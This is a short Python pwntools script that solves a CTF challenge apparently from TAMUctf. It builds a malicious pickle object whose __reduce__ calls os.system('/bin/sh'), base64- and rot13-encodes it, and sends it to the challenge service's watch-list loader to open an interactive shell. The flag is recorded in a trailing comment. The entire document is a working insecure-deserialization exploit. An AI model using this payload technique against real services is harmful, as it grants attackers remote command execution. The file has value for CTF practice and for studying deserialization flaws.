from pwn import *
import base64
import pickle
DEBUG = 0
if DEBUG:
     p = process('./pwn5')
    
else:
     p = remote('pwn.tamuctf.com', 8448)


class Exploit(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
 
def backup():
    p.recvuntil('4. Load your watch list')
    p.sendline('3')

def load(content):
    p.recvuntil('4. Load your watch list')
    p.sendline('4')
    p.recvuntil('ere: ')
    p.sendline(content)

def build_backup(obj):
    string = pickle.dumps(obj)
    encoded = base64.b64encode(string)
    return encoded.encode("rot-13") 

def pwn():
    
    payload=build_backup(Exploit())
    load(payload)
    p.interactive()

if __name__ == '__main__':
   pwn()

#gigem{d0nt_7rust_th3_g1ant_pick1e}

